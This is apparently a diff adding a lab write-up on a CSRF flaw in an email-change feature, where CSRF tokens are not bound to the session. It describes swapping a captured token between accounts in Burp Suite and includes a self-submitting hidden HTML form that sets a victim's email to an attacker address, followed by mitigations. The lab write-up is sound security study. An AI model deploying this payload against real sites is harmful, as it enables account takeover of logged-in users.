@@ -1,0 +1,37 @@
+CSRF – Lab 4
+
+Summary:
+
+This lab demonstrates a Cross-Site Request Forgery (CSRF) vulnerability in the email change functionality. Although the application uses CSRF tokens, the tokens are not bound to the user's session.
+Because of this misconfiguration, a CSRF token generated for one user can be reused by another user, allowing attackers to bypass the CSRF protection.
+
+Exploitation:
+
+After intercepting the email change request using Burp Suite, the CSRF token value was extracted from one account. When testing the request with another account, replacing its token with the previously captured token still resulted in a successful request.
+
+This behavior shows that the server does not validate whether the CSRF token belongs to the current user session.
+
+By embedding a valid CSRF token inside a malicious HTML page, an attacker can trick a logged-in victim into submitting a request that changes their email address.
+
+CSRF PoC:
+
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="attacker@web-security-academy.net">
+    <input type="hidden" name="csrf" value="VALID_CSRF_TOKEN">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+
+
+When a victim visits this page while authenticated, their browser automatically sends the request and updates the account email.
+
+Impact:
+
+Attackers can bypass the CSRF protection and perform actions on behalf of authenticated users.
+
+Mitigation:
+
+* Bind CSRF tokens to the user session.
+* Ensure tokens are unique per user and per request.
+* Implement additional protections such as SameSite cookies and Origin/Referer validation.
